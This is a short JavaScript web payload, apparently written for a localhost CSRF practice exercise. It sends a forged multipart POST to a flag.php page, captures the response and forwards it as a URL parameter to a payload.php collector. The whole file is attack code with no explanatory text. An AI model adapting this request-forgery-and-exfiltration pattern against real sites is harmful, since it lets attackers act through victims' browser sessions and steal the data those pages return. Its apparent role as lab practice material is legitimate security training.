var xhr = new XMLHttpRequest();
// var text="";
data='------WebKitFormBoundarypnNoh0sxdPb4ernp\r\nContent-Disposition: form-data; name="file"; filename="x.txt" \r\nContent-Type: text/plain\r\n\r\n\r\n------WebKitFormBoundarypnNoh0sxdPb4ernp--\r\n'
xhr.open("POST","http://localhost/csrf/practice2/flag.php");
xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundarypnNoh0sxdPb4ernp");
xhr.onreadystatechange = CallbackFun;
xhr.send(data);
function CallbackFun(){
    if (xhr.readyState==4 && xhr.status
==200){
        window.text = xhr.responseText;
        // alert(text);

        submit(text);
    }
}
function submit(text){
    var xhr2 = new XMLHttpRequest();
    xhr2.open("GET","http://localhost/csrf/practice2/payload.php?c="+text);
    xhr2.onreadystatechange=undefined;
    xhr2.send();
}

